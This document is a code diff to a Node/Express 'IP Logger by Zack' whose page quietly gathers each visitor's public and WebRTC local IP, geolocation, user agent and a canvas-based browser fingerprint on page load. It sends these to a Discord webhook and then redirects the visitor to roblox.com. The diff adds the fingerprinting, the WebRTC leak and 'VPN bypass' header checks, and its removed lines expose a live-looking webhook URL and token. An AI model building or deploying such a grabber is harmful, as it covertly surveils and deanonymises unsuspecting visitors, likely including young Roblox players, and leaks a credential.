@@ -6,39 +6,68 @@ const rateLimit = require('express-rate-limit');
 const cors = require('cors');
 const path = require('path');
 const fs = require('fs');
+const { v4: uuidv4 } = require('uuid');
 const app = express();
 
 // Middleware for security and logging
-app.use(helmet()); // Security headers
-app.use(cors()); // Enable CORS
+app.use(helmet({
+  contentSecurityPolicy: {
+    directives: {
+      defaultSrc: ["'self'"],
+      scriptSrc: ["'self'", "'unsafe-inline'"],
+      connectSrc: ["'self'", 'https://ip-api.com', 'https://discord.com'],
+    },
+  },
+}));
+app.use(cors());
 app.use(express.json());
-app.use(morgan('combined')); // HTTP request logging
+app.use(morgan('combined', {
+  stream: {
+    write: (message) => fs.appendFileSync(path.join(__dirname, 'logs.txt'), message),
+  },
+}));
 
 // Rate limiting to prevent abuse
 const limiter = rateLimit({
   windowMs: 15 * 60 * 1000, // 15 minutes
-  max: 100, // Limit each IP to 100 requests per window
+  max: 100,
   message: 'Too many requests, please try again later.',
 });
 app.use(limiter);
 
-// Environment variables (set these in Vercel dashboard)
-const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL || 'https://discordapp.com/api/webhooks/1374699792550068296/cSVi2jtMzUF2376eJbbxn8dqr5cq5qy7gdapMyUg44hGvL0x-YM8vfymlFl7GIb9FSmw';
+// Environment variables
+const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL || 'YOUR_DISCORD_WEBHOOK_URL_HERE';
 const REDIRECT_URL = 'https://www.roblox.com';
 
-// Serve static files (HTML, JS, CSS)
+// Serve static files
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Utility function to get client IP
+// Utility function to get client IP with VPN bypass attempts
 const getClientIp = (req) => {
-  const forwarded = req.headers['x-forwarded-for'];
-  return forwarded ? forwarded.split(',')[0] : req.ip;
+  const headers = req.headers;
+  const ipSources = [
+    headers['x-forwarded-for'],
+    headers['cf-connecting-ip'], // Cloudflare
+    headers['x-real-ip'],
+    headers['x-client-ip'],
+    req.ip,
+  ];
+  let ip = 'Unknown';
+  for (const source of ipSources) {
+    if (source) {
+      ip = source.split(',')[0].trim();
+      break;
+    }
+  }
+  return ip;
 };
 
 // Utility function to fetch geolocation data
 const fetchGeoData = async (ip) => {
   try {
-    const response = await axios.get(`http://ip-api.com/json/${ip}`);
+    const response = await axios.get(`http://ip-api.com/json/${ip}`, {
+      timeout: 5000,
+    });
     return response.data;
   } catch (error) {
     console.error(`GeoData Error: ${error.message}`);
@@ -50,37 +79,40 @@ const fetchGeoData = async (ip) => {
 const sendToDiscord = async (data) => {
   try {
     const embed = {
-      title: 'New Visitor IP Logged',
+      title: 'New Visitor Data Logged',
       color: 0x00ff00,
       fields: [
         { name: 'IP Address', value: data.ip || 'Unknown', inline: true },
+        { name: 'Local IP (WebRTC)', value: data.localIp || 'Unknown', inline: true },
         { name: 'Country', value: data.country || 'Unknown', inline: true },
         { name: 'Region', value: data.region || 'Unknown', inline: true },
         { name: 'City', value: data.city || 'Unknown', inline: true },
         { name: 'ISP', value: data.isp || 'Unknown', inline: true },
         { name: 'User Agent', value: data.userAgent || 'Unknown', inline: false },
+        { name: 'Browser Fingerprint', value: data.fingerprint || 'Unknown', inline: false },
         { name: 'Timestamp', value: new Date().toISOString(), inline: false },
       ],
-      footer: { text: 'IP Logger by Zack' },
+      footer: { text: 'Enhanced IP Logger by Zack' },
     };
 
-    await axios.post(DISCORD_WEBHOOK_URL, {
-      embeds: [embed],
-    });
+    await axios.post(DISCORD_WEBHOOK_URL, { embeds: [embed] });
   } catch (error) {
     console.error(`Discord Webhook Error: ${error.message}`);
   }
 };
 
-// Route to handle IP logging
-app.get('/log', async (req, res) => {
+// Route to handle data logging
+app.post('/log', async (req, res) => {
   try {
+    const { localIp, fingerprint } = req.body;
     const ip = getClientIp(req);
     const userAgent = req.headers['user-agent'] || 'Unknown';
     const geoData = await fetchGeoData(ip);
 
     const logData = {
       ip,
+      localIp: localIp || 'Unknown',
+      fingerprint: fingerprint || 'Unknown',
       userAgent,
       country: geoData?.country || 'Unknown',
       region: geoData?.regionName || 'Unknown',
@@ -91,25 +123,28 @@ app.get('/log', async (req, res) => {
     // Send to Discord
     await sendToDiscord(logData);
 
-    // Log to file for debugging
+    // Log to file
     fs.appendFileSync(
       path.join(__dirname, 'logs.txt'),
-      `[${new Date().toISOString()}] IP: ${ip}, UA: ${userAgent}\n`
+      `[${new Date().toISOString()}] IP: ${ip}, Local IP: ${localIp}, Fingerprint: ${fingerprint}, UA: ${userAgent}\n`
     );
 
-    // Redirect to Roblox
-    res.redirect(REDIRECT_URL);
+    res.json({ success: true });
   } catch (error) {
     console.error(`Log Route Error: ${error.message}`);
-    res.redirect(REDIRECT_URL); // Redirect even if error occurs
+    res.status(500).json({ error: 'Internal server error' });
   }
+});
+
+// Serve HTML
+app.get('/', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
 // Error handling middleware
 app.use((err, req, res, next) => {
   console.error(`Server Error: ${err.message}`);
-  res.status(500).send('Something went wrong, but you\'re being redirected!');
-  setTimeout(() => res.redirect(REDIRECT_URL), 1000);
+  res.redirect(REDIRECT_URL);
 });
 
 // Frontend HTML
@@ -182,33 +217,95 @@ const htmlContent = `
       }
     };
 
-    // Fetch IP and log to server
-    const logIp = async () => {
+    // Generate browser fingerprint
+    const getFingerprint = async () => {
       try {
-        const response = await fetch('/log', { method: 'GET' });
-        if (!response.ok) {
-          throw new Error('Failed to log IP');
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = 'top';
+        ctx.font = '14px Arial';
+        ctx.fillText('Fingerprint', 2, 2);
+        const canvasData = canvas.toDataURL();
+
+        const fingerprint = {
+          userAgent: navigator.userAgent,
+          language: navigator.language,
+          screen: \`\${window.screen.width}x\${window.screen.height}\`,
+          colorDepth: window.screen.colorDepth,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          canvas: canvasData.substring(0, 50), // Partial canvas data
+        };
+        return btoa(JSON.stringify(fingerprint)); // Base64 encode
+      } catch (error) {
+        logError('Fingerprint Error: ' + error.message);
+        return 'Unknown';
+      }
+    };
+
+    // Get local IP via WebRTC
+    const getLocalIp = () => {
+      return new Promise((resolve) => {
+        try {
+          const RTCPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
+          if (!RTCPeerConnection) {
+            resolve('WebRTC Not Supported');
+            return;
+          }
+
+          const pc = new RTCPeerConnection({ iceServers: [] });
+          pc.createDataChannel('');
+          pc.onicecandidate = (event) => {
+            if (event.candidate) {
+              const ipMatch = event.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
+              if (ipMatch) resolve(ipMatch[1]);
+            }
+          };
+          pc.createOffer()
+            .then((offer) => pc.setLocalDescription(offer))
+            .catch((error) => {
+              logError('WebRTC Error: ' + error.message);
+              resolve('Unknown');
+            });
+
+          setTimeout(() => resolve('Unknown'), 2000); // Fallback
+        } catch (error) {
+          logError('WebRTC Setup Error: ' + error.message);
+          resolve('Unknown');
         }
-        // Redirect handled by server
+      });
+    };
+
+    // Send data to server
+    const logData = async () => {
+      try {
+        const localIp = await getLocalIp();
+        const fingerprint = await getFingerprint();
+        const response = await fetch('/log', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ localIp, fingerprint }),
+        });
+        if (!response.ok) {
+          throw new Error('Failed to log data');
+        }
+        window.location.href = '${REDIRECT_URL}';
       } catch (error) {
         logError('Client Error: ' + error.message);
-        // Fallback redirect
-        setTimeout(() => {
-          window.location.href = '${REDIRECT_URL}';
-        }, 1000);
+        setTimeout(() => window.location.href = '${REDIRECT_URL}', 1000);
       }
     };
 
     // Run on page load
     window.onload = () => {
       try {
-        logIp();
+        logData();
       } catch (error) {
         logError('Onload Error: ' + error.message);
+        setTimeout(() => window.location.href = '${REDIRECT_URL}', 1000);
       }
     };
 
-    // Fallback redirect after 3 seconds
+    // Fallback redirect
     setTimeout(() => {
       try {
         window.location.href = '${REDIRECT_URL}';
@@ -262,6 +359,7 @@ const packageJson = {
     helmet: '^7.1.0',
     'express-rate-limit': '^7.1.5',
     cors: '^2.8.5',
+    uuid: '^9.0.1',
   },
 };
 
